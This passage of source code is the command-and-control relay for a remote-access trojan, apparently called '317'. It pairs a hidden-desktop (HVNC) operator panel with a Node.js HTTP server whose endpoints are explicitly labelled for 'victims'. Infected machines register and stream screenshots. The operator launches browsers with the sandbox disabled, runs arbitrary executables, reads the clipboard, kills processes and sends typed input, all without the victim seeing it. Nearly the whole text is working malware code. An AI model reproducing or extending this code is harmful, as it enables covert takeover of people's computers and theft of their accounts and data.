.fm-action-btn.danger:hover{color:var(--danger);border-color:rgba(239,68,68,0.3)}
.fm-toolbar{display:flex;gap:4px;margin-top:4px}
.fm-toolbar-btn{flex:1;display:flex;align-items:center;justify-content:center;gap:4px;padding:6px;border-radius:4px;border:1px solid var(--card-border);background:none;color:var(--text);font-size:9px;font-weight:600;cursor:pointer;font-family:'Inter',sans-serif;transition:all .15s}
.fm-toolbar-btn:hover{background:rgba(255,255,255,0.04);border-color:rgba(255,255,255,0.12)}
.fm-empty{text-align:center;padding:20px;font-size:10px;color:var(--muted)}
.fm-loading{text-align:center;padding:12px;font-size:10px;color:var(--muted)}
.fm-modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.8);z-index:200;align-items:center;justify-content:center}
.fm-modal-overlay.active{display:flex}
.fm-modal{background:var(--card);border:1px solid var(--card-border);border-radius:10px;padding:20px;min-width:300px;max-width:400px}
.fm-modal h3{font-size:12px;font-weight:700;margin-bottom:12px;letter-spacing:.5px}
.fm-modal-input{width:100%;background:rgba(255,255,255,0.03);border:1px solid var(--card-border);border-radius:6px;padding:8px 12px;color:var(--text);font-size:11px;font-family:'Inter',sans-serif;outline:none;margin-bottom:10px}
.fm-modal-input:focus{border-color:rgba(255,255,255,0.2)}
.fm-modal-btns{display:flex;gap:6px;justify-content:flex-end}
.fm-modal-btn{padding:6px 14px;border-radius:5px;border:1px solid var(--card-border);background:none;color:var(--text);font-size:10px;font-weight:600;cursor:pointer;font-family:'Inter',sans-serif}
.fm-modal-btn.primary{background:rgba(255,255,255,0.08);border-color:rgba(255,255,255,0.15)}
.fm-modal-btn:hover{background:rgba(255,255,255,0.06)}
@media(max-width:900px){.sidebar{width:240px}}
@media(max-width:700px){.main{flex-direction:column}.sidebar{width:100%;max-height:40vh}}
</style>
</head>
<body>
<div class="topbar">
  <div class="topbar-left">
    <div>
      <div class="logo">317 HVNC</div>
      <div class="logo-sub">Hidden Desktop</div>
    </div>
    <span class="badge badge-hvnc"><span class="dot"></span> ACTIVE</span>

  </div>
  <span class="agent-tag">${agentId}</span>
</div>
<div class="main">
  <div class="tab-panel active" id="tabDesktop" style="display:flex;flex:1;overflow:hidden">
  <div class="screen-area" id="screenArea">
    <div class="screen-wrapper" id="screenWrapper">
      <div class="screen-loading" id="loadingOverlay"><div class="spinner"></div><span class="loading-text">Connecting</span></div>
      <img id="screenImg" src="about:blank" alt="HVNC Desktop" draggable="false">
      <div class="screen-overlay">
        <span class="screen-badge screen-fps" id="fpsTag">-- FPS</span>
        <span class="screen-badge screen-res" id="resTag">--</span>
      </div>
    </div>
    <div class="cursor-indicator" id="cursorDot"></div>
  </div>
  <div class="sidebar">
    <div class="sidebar-section">
      <div class="section-title">Launch Application</div>
      <div class="app-grid">
        <button class="app-btn" onclick="launchApp('chrome')"><span class="icon">🌐</span><span>Chrome</span></button>
        <button class="app-btn" onclick="launchApp('firefox')"><span class="icon">🦊</span><span>Firefox</span></button>
        <button class="app-btn" onclick="launchApp('edge')"><span class="icon">📘</span><span>Edge</span></button>
        <button class="app-btn" onclick="launchApp('explorer')"><span class="icon">📁</span><span>Explorer</span></button>
        <button class="app-btn" onclick="launchApp('cmd')"><span class="icon">⬛</span><span>CMD</span></button>
        <button class="app-btn" onclick="launchApp('powershell')"><span class="icon">🔷</span><span>PowerShell</span></button>
        <button class="app-btn" onclick="launchApp('notepad')"><span class="icon">📝</span><span>Notepad</span></button>
        <button class="app-btn" onclick="launchApp('taskmgr')"><span class="icon">📊</span><span>Task Mgr</span></button>
      </div>
    </div>
    <div class="sidebar-section">
      <div class="section-title">Custom Launch</div>
      <div class="input-row">
        <input class="input-field" id="customPath" type="text" placeholder="C:\\\\path\\\\to\\\\app.exe">
        <button class="send-btn" onclick="launchCustom()">Run</button>
      </div>
    </div>
    <div class="sidebar-section">
      <div class="section-title">Keyboard Input</div>
      <div class="input-row">
        <input class="input-field" id="typeInput" type="text" placeholder="Type text..." onkeydown="if(event.key==='Enter')sendText()">
        <button class="send-btn" onclick="sendText()">Send</button>
      </div>
      <div style="margin-top:8px;display:flex;flex-wrap:wrap;gap:4px">
        <button class="action-btn" style="padding:6px 10px;font-size:10px" onclick="sendKey(0x0D)">Enter</button>
        <button class="action-btn" style="padding:6px 10px;font-size:10px" onclick="sendKey(0x09)">Tab</button>
        <button class="action-btn" style="padding:6px 10px;font-size:10px" onclick="sendKey(0x1B)">Esc</button>
        <button class="action-btn" style="padding:6px 10px;font-size:10px" onclick="sendKey(0x08)">Bksp</button>
        <button class="action-btn" style="padding:6px 10px;font-size:10px" onclick="sendCombo([0x11,0x41])">Ctrl+A</button>
        <button class="action-btn" style="padding:6px 10px;font-size:10px" onclick="sendCombo([0x11,0x43])">Ctrl+C</button>
        <button class="action-btn" style="padding:6px 10px;font-size:10px" onclick="sendCombo([0x11,0x56])">Ctrl+V</button>
        <button class="action-btn" style="padding:6px 10px;font-size:10px" onclick="sendCombo([0x12,0x73])">Alt+F4</button>
        <button class="action-btn" style="padding:6px 10px;font-size:10px" onclick="sendCombo([0x11,0x57])">Ctrl+W</button>
        <button class="action-btn" style="padding:6px 10px;font-size:10px" onclick="sendKey(0x74)">F5</button>
      </div>
    </div>
    <div class="sidebar-section">
      <div class="section-title">Clipboard</div>
      <div class="input-row">
        <input class="input-field" id="clipInput" type="text" placeholder="Set clipboard...">
        <button class="send-btn" onclick="hvncSetClipboard()">Set</button>
      </div>
      <div style="margin-top:6px">
        <button class="action-btn" onclick="hvncGetClipboard()" style="width:100%"><span class="icon">📋</span> Get Clipboard</button>
      </div>
      <div id="clipResult" style="margin-top:6px;font-size:10px;color:var(--muted);word-break:break-all;max-height:60px;overflow-y:auto;display:none;padding:6px;background:rgba(255,255,255,0.02);border-radius:4px;border:1px solid var(--card-border)"></div>
    </div>
    <div class="sidebar-section">
      <div class="section-title">Window Manager</div>
      <button class="action-btn" onclick="hvncListWindows()" style="width:100%;margin-bottom:6px"><span class="icon">🪟</span> Refresh Windows</button>
      <div id="windowList" style="max-height:120px;overflow-y:auto;display:flex;flex-direction:column;gap:3px"></div>
    </div>
    <div class="sidebar-section">
      <div class="section-title">Process Manager</div>
      <button class="action-btn" onclick="hvncListProcesses()" style="width:100%;margin-bottom:6px"><span class="icon">⚙</span> Refresh Processes</button>
      <div id="processList" style="max-height:120px;overflow-y:auto;display:flex;flex-direction:column;gap:3px"></div>
    </div>

    <div class="sidebar-section">
      <div class="section-title">Display & Capture</div>
      <div style="display:flex;gap:4px;margin-bottom:6px">
        <select class="input-field" id="resSelect" style="flex:1">
          <option value="1920x1080" selected>1920x1080</option>
          <option value="1280x720">1280x720</option>
          <option value="1366x768">1366x768</option>
          <option value="1600x900">1600x900</option>
        </select>
        <button class="send-btn" onclick="hvncSetRes()">Set</button>
      </div>
      <button class="action-btn" onclick="hvncCaptureHQ()" style="width:100%"><span class="icon">📸</span> HQ Screenshot</button>
    </div>
    <div class="sidebar-section">
      <div class="section-title">Session Control</div>
      <div class="action-list">
        <button class="action-btn" onclick="refreshDesktop()"><span class="icon">↻</span> Refresh Desktop</button>
        <button class="action-btn danger" onclick="closeHvnc()"><span class="icon">⏻</span> Close HVNC</button>
      </div>
    </div>
  </div>
  </div><!-- /tabDesktop -->
</div>
<div class="statusbar">
  <div class="status-left">
    <span class="status-dot"></span>
    <span>HVNC SESSION ACTIVE</span>
  </div>
  <span id="lastUpdate">Connecting...</span>
</div>
<div class="toast" id="toast"></div>
<script>
const AGENT='${agentId}';
let frameCount=0,lastFpsTime=Date.now(),currentFps=0;
let _prevBlobUrl=null;

// Display a frame blob on screen
function displayFrame(blob){
  if(blob.size<200)return;
  const url=URL.createObjectURL(blob);
  const img=document.getElementById('screenImg');
  img.onload=function(){
    document.getElementById('loadingOverlay').classList.add('hidden');
    document.getElementById('resTag').textContent=img.naturalWidth+'x'+img.naturalHeight;
    if(_prevBlobUrl)URL.revokeObjectURL(_prevBlobUrl);
    _prevBlobUrl=url;
  };
  img.src=url;
  frameCount++;
  const now=Date.now();
  if(now-lastFpsTime>=2000){currentFps=Math.round(frameCount/((now-lastFpsTime)/1000));frameCount=0;lastFpsTime=now;
    document.getElementById('fpsTag').textContent=currentFps+' FPS';}
  document.getElementById('lastUpdate').textContent=new Date().toLocaleTimeString();
}

// Simple polling — same proven pattern as stream session panel
function createFetchStream(){
  async function loop(){
    while(true){
      try{
        const r=await fetch('/'+AGENT+'/hvnc/screen?t='+Date.now());
        if(!r.ok){await new Promise(r=>setTimeout(r,500));continue;}
        const blob=await r.blob();
        displayFrame(blob);
      }catch(e){
        document.getElementById('lastUpdate').textContent='Waiting...';
        await new Promise(r=>setTimeout(r,1000));
      }
    }
  }
  loop();
}
// 3 parallel fetch streams — same as stream session
createFetchStream();
createFetchStream();
createFetchStream();

// Auto-poll query results every 2s for clipboard/windows/processes
setInterval(pollQueryResults,2000);

// Mouse interaction on screen
const screenArea=document.getElementById('screenArea');
const screenImg=document.getElementById('screenImg');
const cursorDot=document.getElementById('cursorDot');

function getRelativeCoords(e){
  const rect=screenImg.getBoundingClientRect();
  const x=Math.round((e.clientX-rect.left)/(rect.width)*screenImg.naturalWidth);
  const y=Math.round((e.clientY-rect.top)/(rect.height)*screenImg.naturalHeight);
  return{x:Math.max(0,x),y:Math.max(0,y)};
}

screenImg.addEventListener('click',function(e){
  e.preventDefault();
  const c=getRelativeCoords(e);
  sendMouse(c.x,c.y,'click');
  showCursorFeedback(e);
});

screenImg.addEventListener('dblclick',function(e){
  e.preventDefault();
  const c=getRelativeCoords(e);
  sendMouse(c.x,c.y,'dblclick');
});

screenImg.addEventListener('contextmenu',function(e){
  e.preventDefault();
  const c=getRelativeCoords(e);
  sendMouse(c.x,c.y,'rightclick');
});

screenImg.addEventListener('mousemove',function(e){
  const dot=document.getElementById('cursorDot');
  dot.style.left=(e.clientX-4)+'px';
  dot.style.top=(e.clientY-4)+'px';
  dot.classList.add('active');
});

screenArea.addEventListener('mouseleave',function(){
  cursorDot.classList.remove('active');
});

screenImg.addEventListener('wheel',function(e){
  e.preventDefault();
  const c=getRelativeCoords(e);
  const dir=e.deltaY<0?'up':'down';
  sendScroll(c.x,c.y,dir);
},{passive:false});

function showCursorFeedback(e){
  const dot=cursorDot;
  dot.style.left=(e.clientX-4)+'px';
  dot.style.top=(e.clientY-4)+'px';
  dot.style.transform='scale(2)';dot.style.opacity='0.5';
  setTimeout(()=>{dot.style.transform='scale(1)';dot.style.opacity='1';},150);
}

// API calls
async function sendMouse(x,y,action){
  try{
    await fetch('/'+AGENT+'/hvnc/input',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'mouse',x,y,action})});
  }catch(e){}
}

async function sendScroll(x,y,direction){
  try{
    await fetch('/'+AGENT+'/hvnc/input',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'scroll',x,y,direction})});
  }catch(e){}
}

async function sendKey(vk){
  try{
    await fetch('/'+AGENT+'/hvnc/input',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'key',vk,keyUp:false})});
    setTimeout(()=>{fetch('/'+AGENT+'/hvnc/input',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'key',vk,keyUp:true})});},50);
  }catch(e){}
}

async function sendCombo(keys){
  try{
    for(let i=0;i<keys.length;i++){await fetch('/'+AGENT+'/hvnc/input',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'key',vk:keys[i],keyUp:false})});}
    for(let i=keys.length-1;i>=0;i--){await fetch('/'+AGENT+'/hvnc/input',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'key',vk:keys[i],keyUp:true})});}
  }catch(e){}
}

async function sendText(){
  const inp=document.getElementById('typeInput');
  const text=inp.value;if(!text)return;inp.value='';
  try{
    await fetch('/'+AGENT+'/hvnc/input',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'type',text})});
    showToast('Text sent','success');
  }catch(e){showToast('Failed','danger');}
}

async function launchApp(name){
  const apps={
    chrome:{path:'C:\\\\Program Files\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe',args:'--disable-gpu --no-sandbox --disable-gpu-compositing --in-process-gpu --disable-features=RendererCodeIntegrity,InfiniteSessionRestore --no-first-run --no-default-browser-check --disable-session-crashed-bubble --hide-crash-restore-bubble --disable-infobars'},
    firefox:{path:'C:\\\\Program Files\\\\Mozilla Firefox\\\\firefox.exe',args:''},
    edge:{path:'C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe',args:'--disable-gpu --no-sandbox --disable-gpu-compositing --in-process-gpu --disable-features=RendererCodeIntegrity,InfiniteSessionRestore --no-first-run --no-default-browser-check --disable-session-crashed-bubble --hide-crash-restore-bubble --disable-infobars'},
    explorer:{path:'C:\\\\Windows\\\\explorer.exe',args:''},
    cmd:{path:'C:\\\\Windows\\\\System32\\\\cmd.exe',args:''},
    powershell:{path:'C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe',args:''},
    notepad:{path:'C:\\\\Windows\\\\System32\\\\notepad.exe',args:''},
    taskmgr:{path:'C:\\\\Windows\\\\System32\\\\Taskmgr.exe',args:''}
  };
  const app=apps[name];if(!app)return;
  try{
    const r=await fetch('/'+AGENT+'/hvnc/launch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({path:app.path,args:app.args})});
    const d=await r.json();
    if(d.success)showToast(name+' launched','success');else showToast('Launch failed','danger');
  }catch(e){showToast('Error','danger');}
}

async function launchCustom(){
  const inp=document.getElementById('customPath');
  const p=inp.value.trim();if(!p)return;
  try{
    const r=await fetch('/'+AGENT+'/hvnc/launch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({path:p,args:''})});
    const d=await r.json();
    if(d.success){showToast('Launched','success');inp.value='';}else showToast('Failed','danger');
  }catch(e){showToast('Error','danger');}
}

async function refreshDesktop(){
  showToast('Refreshing...','success');
  try{
    const r=await fetch('/'+AGENT+'/hvnc/screen?t='+Date.now());
    if(r.ok){
      const blob=await r.blob();
      displayFrame(blob);
      showToast('Desktop refreshed','success');
    }else{showToast('No frame available','danger');}
  }catch(e){showToast('Refresh failed','danger');}
}

async function closeHvnc(){
  if(!confirm('Close HVNC session?'))return;
  try{
    await fetch('/'+AGENT+'/hvnc/close',{method:'POST'});
    showToast('HVNC closed','success');
    setTimeout(()=>window.close(),1000);
  }catch(e){showToast('Error','danger');}
}

function showToast(msg,type){
  const t=document.getElementById('toast');
  t.textContent=msg;t.className='toast toast-'+type+' show';
  setTimeout(()=>{t.classList.remove('show');},2000);
}

// === CLIPBOARD ===
async function hvncGetClipboard(){
  showToast('Reading clipboard...','success');
  await fetch('/'+AGENT+'/hvnc/input',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'getClipboard'})});
  setTimeout(pollQueryResults,800);
}
async function hvncSetClipboard(){
  const inp=document.getElementById('clipInput');
  const text=inp.value;if(!text)return;
  await fetch('/'+AGENT+'/hvnc/input',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'setClipboard',text})});
  inp.value='';showToast('Clipboard set','success');
}

// === WINDOW MANAGER ===
async function hvncListWindows(){
  await fetch('/'+AGENT+'/hvnc/input',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'listWindows'})});
  setTimeout(pollQueryResults,800);
}
function renderWindows(wins){
  const el=document.getElementById('windowList');
  if(!wins||!wins.length){el.innerHTML='<span style="font-size:10px;color:var(--muted)">No windows</span>';return;}
  el.innerHTML=wins.map(w=>'<div style="display:flex;align-items:center;gap:4px;padding:4px 6px;background:rgba(255,255,255,0.02);border-radius:4px;border:1px solid var(--card-border)">'
    +'<span style="flex:1;font-size:9px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="'+w.title+'">'+w.title+'</span>'
    +'<span style="font-size:8px;color:var(--muted)">'+w.size+'</span>'
    +'<button onclick="hvncFocusWin('+w.hwnd+')" style="background:none;border:1px solid var(--card-border);color:var(--accent);padding:2px 5px;border-radius:3px;cursor:pointer;font-size:8px">Focus</button>'
    +'<button onclick="hvncCloseWin('+w.hwnd+')" style="background:none;border:1px solid rgba(239,68,68,0.3);color:var(--danger);padding:2px 5px;border-radius:3px;cursor:pointer;font-size:8px">X</button>'
    +'</div>').join('');
}
async function hvncFocusWin(hwnd){
  await fetch('/'+AGENT+'/hvnc/input',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'focusWindow',hwnd:String(hwnd)})});
  showToast('Window focused','success');
}
async function hvncCloseWin(hwnd){
  await fetch('/'+AGENT+'/hvnc/input',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'closeWindow',hwnd:String(hwnd)})});
  showToast('Window closed','success');
  setTimeout(hvncListWindows,500);
}

// === PROCESS MANAGER ===
async function hvncListProcesses(){
  await fetch('/'+AGENT+'/hvnc/input',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'listProcesses'})});
  setTimeout(pollQueryResults,800);
}
function renderProcesses(procs){
  const el=document.getElementById('processList');
  if(!procs||!procs.length){el.innerHTML='<span style="font-size:10px;color:var(--muted)">No processes</span>';return;}
  el.innerHTML=procs.map(p=>'<div style="display:flex;align-items:center;gap:4px;padding:4px 6px;background:rgba(255,255,255,0.02);border-radius:4px;border:1px solid var(--card-border)">'
    +'<span style="flex:1;font-size:9px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="'+p.title+'">'+p.name+' <span style="color:var(--muted)">('+p.pid+')</span></span>'
    +'<button onclick="hvncKillProc('+p.pid+')" style="background:none;border:1px solid rgba(239,68,68,0.3);color:var(--danger);padding:2px 5px;border-radius:3px;cursor:pointer;font-size:8px">Kill</button>'
    +'</div>').join('');
}
async function hvncKillProc(pid){
  await fetch('/'+AGENT+'/hvnc/input',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'killProcess',pid})});
  showToast('Process killed','success');
  setTimeout(hvncListProcesses,500);
}

// === RESOLUTION ===
async function hvncSetRes(){
  const v=document.getElementById('resSelect').value.split('x');
  await fetch('/'+AGENT+'/hvnc/input',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'setResolution',width:parseInt(v[0]),height:parseInt(v[1])})});
  showToast('Resolution: '+v.join('x'),'success');
}

// === HQ SCREENSHOT ===
async function hvncCaptureHQ(){
  showToast('Capturing HQ...','success');
  await fetch('/'+AGENT+'/hvnc/input',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'captureHQ'})});
  setTimeout(async()=>{
    try{
      const r=await fetch('/'+AGENT+'/hvnc/screenhq');
      if(r.status===200){
        const blob=await r.blob();
        const url=URL.createObjectURL(blob);
        const a=document.createElement('a');a.href=url;a.download='hvnc_hq_'+Date.now()+'.jpg';
        document.body.appendChild(a);a.click();a.remove();URL.revokeObjectURL(url);
        showToast('HQ saved','success');
      }else{showToast('HQ not ready, try again','danger');}
    }catch(e){showToast('HQ failed','danger');}
  },2000);
}

// === QUERY RESULT POLLING ===
async function pollQueryResults(){
  try{
    const r=await fetch('/'+AGENT+'/hvnc/queryresult');
    const d=await r.json();
    if(d.results&&d.results.length>0){
      d.results.forEach(res=>{
        if(res.type==='clipboard'){
          const el=document.getElementById('clipResult');
          el.style.display='block';
          el.textContent=res.data||'(empty)';
          showToast('Clipboard received','success');
        }else if(res.type==='windows'){
          renderWindows(res.data);
        }else if(res.type==='processes'){
          renderProcesses(res.data);
        }
      });
    }
  }catch(e){}
}

</script>
</body>
</html>`;
}

/**
 * Parse request body as JSON
 */
function parseBody(req) {
  return new Promise((resolve) => {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      try { resolve(JSON.parse(body)); }
      catch { resolve(null); }
    });
  });
}

/**
 * Parse raw body as Buffer
 */
function parseRawBody(req) {
  return new Promise((resolve) => {
    const chunks = [];
    req.on('data', chunk => chunks.push(chunk));
    req.on('end', () => resolve(Buffer.concat(chunks)));
  });
}

// Clean up stale sessions (no heartbeat for 1 hour)
setInterval(() => {
  const now = Date.now();
  for (const [id, session] of sessions) {
    if (now - session.lastSeen > 3600000) {
      console.log(`[Relay] Session ${id} timed out (1h)`);
      sessions.delete(id);
    }
  }
  for (const [id, hvnc] of hvncSessions) {
    if (now - hvnc.lastSeen > 3600000) {
      console.log(`[Relay] HVNC ${id} timed out (1h)`);
      hvncSessions.delete(id);
    }
  }
}, 60000);

/**
 * HTTP Server
 */
const server = http.createServer(async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    return res.end();
  }

  const urlPath = req.url.split('?')[0];

  // ========== VICTIM ENDPOINTS ==========

  // POST /api/register — Victim registers with system info
  if (urlPath === '/api/register' && req.method === 'POST') {
    const data = await parseBody(req);
    if (!data || !data.agentId) {
      res.writeHead(400);
      return res.end('Missing agentId');
    }
    sessions.set(data.agentId, {
      systemInfo: data.systemInfo || {},
      screenshot: null,
      lastSeen: Date.now(),
      commands: [],
      chatMessages: [],
      chatActive: false
    });
    console.log(`[Relay] Agent ${data.agentId} registered (${data.systemInfo?.username}@${data.systemInfo?.computerName})`);
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ success: true }));
  }

  // POST /api/screenshot/:agentId — Victim uploads screenshot
  const screenMatch = urlPath.match(/^\/api\/screenshot\/([A-Z0-9]+)$/);
  if (screenMatch && req.method === 'POST') {
    const agentId = screenMatch[1];
    let session = sessions.get(agentId);
    // Auto-create session if it expired (self-healing)
    if (!session) {
      session = { systemInfo: {}, screenshot: null, lastSeen: Date.now(), commands: [], chatMessages: [], chatActive: false };
      sessions.set(agentId, session);
      console.log(`[Relay] Agent ${agentId} auto-recovered`);
    }
    session.screenshot = await parseRawBody(req);
    session.lastSeen = Date.now();
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ success: true, commands: session.commands.splice(0) }));
  }

  // POST /api/heartbeat/:agentId — Victim heartbeat + get commands
  const hbMatch = urlPath.match(/^\/api\/heartbeat\/([A-Z0-9]+)$/);
  if (hbMatch && req.method === 'POST') {
    const agentId = hbMatch[1];
    let session = sessions.get(agentId);
    if (!session) {
      // Auto-create on heartbeat too
      session = { systemInfo: {}, screenshot: null, lastSeen: Date.now(), commands: [], chatMessages: [], chatActive: false };
      sessions.set(agentId, session);
    }
    session.lastSeen = Date.now();
    // Update systemInfo from heartbeat body if provided
    const data = await parseBody(req);
    if (data && data.uptime !== undefined) {
      session.systemInfo.uptime = data.uptime;
    }
    const cmds = session.commands.splice(0);
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ success: true, commands: cmds }));
  }

  // ========== CHAT API (VICTIM SIDE) ==========

  // POST /api/chat/:agentId — Victim sends a chat message
  const chatSendMatch = urlPath.match(/^\/api\/chat\/([A-Z0-9]+)$/);
  if (chatSendMatch && req.method === 'POST') {
    const agentId = chatSendMatch[1];
    const session = sessions.get(agentId);
    if (!session) {
      res.writeHead(404);
      return res.end('Session not found');
    }
    const data = await parseBody(req);
    if (data && data.text) {
      session.chatMessages.push({ from: 'victim', text: data.text, timestamp: Date.now() });
      console.log(`[Chat] Victim ${agentId}: ${data.text}`);
    }
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ success: true }));
  }

  // GET /api/chat/:agentId — Victim polls for new messages from panel
  if (chatSendMatch && req.method === 'GET') {
    const agentId = chatSendMatch[1];
    const session = sessions.get(agentId);
    if (!session) {
      res.writeHead(404);
      return res.end('Session not found');
    }
    const url = new URL(req.url, `http://${req.headers.host}`);
    const since = parseInt(url.searchParams.get('since') || '0');
    const messages = session.chatMessages.filter(m => m.from === 'panel' && m.timestamp > since);
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ messages, chatActive: session.chatActive }));
  }

  // GET /api/chat/status/:agentId — Victim checks if chat is active
  const chatStatusMatch = urlPath.match(/^\/api\/chat\/status\/([A-Z0-9]+)$/);
  if (chatStatusMatch && req.method === 'GET') {
    const agentId = chatStatusMatch[1];
    const session = sessions.get(agentId);
    if (!session) {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ chatActive: false }));
    }
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ chatActive: session.chatActive }));
  }

  // ========== HVNC VICTIM ENDPOINTS ==========

  // POST /api/hvnc/register — Victim registers HVNC session
  if (urlPath === '/api/hvnc/register' && req.method === 'POST') {
    const data = await parseBody(req);
    if (!data || !data.agentId) {
      res.writeHead(400);
      return res.end('Missing agentId');
    }
    hvncSessions.set(data.agentId, {
      desktopName: data.desktopName || 'unknown',
      screenshot: null,
      screenshotHQ: null,
      lastSeen: Date.now(),
      hvncCommands: [],
      queryResults: [],
      frameVersion: 0,
      frameWaiters: []
    });
    console.log(`[HVNC] Agent ${data.agentId} registered HVNC (desktop: ${data.desktopName})`);
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ success: true }));
  }

  // POST /api/hvnc/screenshot/:agentId — Victim uploads HVNC desktop frame
  const hvncScreenMatch = urlPath.match(/^\/api\/hvnc\/screenshot\/([A-Z0-9]+)$/);
  if (hvncScreenMatch && req.method === 'POST') {
    const agentId = hvncScreenMatch[1];
    let hvnc = hvncSessions.get(agentId);
    if (!hvnc) {
      hvnc = { desktopName: 'unknown', screenshot: null, screenshotHQ: null, lastSeen: Date.now(), hvncCommands: [], queryResults: [], frameVersion: 0, frameWaiters: [] };
      hvncSessions.set(agentId, hvnc);
    }
    const frameData = await parseRawBody(req);
    const urlObj = new URL(req.url, `http://${req.headers.host}`);
    if (urlObj.searchParams.get('hq') === '1') {
      hvnc.screenshotHQ = frameData;
    } else {
      hvnc.screenshot = frameData;
    }
    hvnc.lastSeen = Date.now();
    const cmds = hvnc.hvncCommands.splice(0);
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ success: true, hvncCommands: cmds }));
  }

  // POST /api/hvnc/queryresult/:agentId — Victim sends query results
  const hvncQueryMatch = urlPath.match(/^\/api\/hvnc\/queryresult\/([A-Z0-9]+)$/);
  if (hvncQueryMatch && req.method === 'POST') {
    const agentId = hvncQueryMatch[1];
    const hvnc = hvncSessions.get(agentId);
    if (hvnc) {
      const data = await parseBody(req);
      if (data) {
        if (!hvnc.queryResults) hvnc.queryResults = [];
        hvnc.queryResults.push(data);
      }
    }
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ success: true }));
  }

  // ========== VIEWER ENDPOINTS ==========

  // Extract agentId from /:agentId paths
  const agentMatch = urlPath.match(/^\/([A-Z0-9]{8})(\/.*)?$/);
  if (agentMatch) {
    const agentId = agentMatch[1];
    const subPath = agentMatch[2] || '/';
    const session = sessions.get(agentId);

    if (!session && !subPath.startsWith('/hvnc')) {
      // Show a waiting page instead of plain error (but let HVNC endpoints through)
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      return res.end(`<!DOCTYPE html><html><head><meta charset="UTF-8"><title>317 Stream — Waiting</title>
<meta http-equiv="refresh" content="5">
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Inter',sans-serif;background:#06060b;color:#e2e8f0;display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column;gap:20px}
.spinner{width:50px;height:50px;border:3px solid #262626;border-top-color:#ffffff;border-radius:50%;animation:spin .8s linear infinite}@keyframes spin{to{transform:rotate(360deg)}}
h2{font-size:20px;font-weight:700;background:linear-gradient(135deg,#ffffff,#a3a3a3);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
p{color:#64748b;font-size:13px}</style></head>
<body><div class="spinner"></div><h2>317 STREAM</h2><p>Waiting for victim connection... (${agentId})</p><p style="font-size:11px;margin-top:10px">Auto-refreshing every 5 seconds</p></body></html>`);
    }

    // GET /:agentId — Serve panel
    if (subPath === '/' || subPath === '') {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      return res.end(buildPanelHTML(session, agentId));
    }

    // GET /:agentId/screen — Serve latest screenshot
    if (subPath === '/screen') {
      if (session.screenshot) {
        res.writeHead(200, {
          'Content-Type': 'image/jpeg',
          'Cache-Control': 'no-store, no-cache',
          'Content-Length': session.screenshot.length
        });
        return res.end(session.screenshot);
      }
      res.writeHead(503);
      return res.end('No screenshot yet');
    }

    // GET /:agentId/info — System info
    if (subPath === '/info') {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({
        ...session.systemInfo,
        agentId,
        lastSeen: session.lastSeen,
        uptime: session.systemInfo.uptime || 0
      }));
    }

    // POST /:agentId/command — Queue command for victim
    if (subPath === '/command' && req.method === 'POST') {
      const data = await parseBody(req);
      if (data && data.action) {
        session.commands.push(data.action);
        console.log(`[Relay] Command queued for ${agentId}: ${data.action}`);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ success: true }));
      }
      res.writeHead(400);
      return res.end('Invalid command');
    }

    // POST /:agentId/chat/start — Panel activates chat session
    if (subPath === '/chat/start' && req.method === 'POST') {
      session.chatActive = true;
      session.commands.push('chat_open');
      console.log(`[Chat] Panel activated chat for ${agentId}`);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ success: true }));
    }

    // POST /:agentId/chat/stop — Panel deactivates chat session
    if (subPath === '/chat/stop' && req.method === 'POST') {
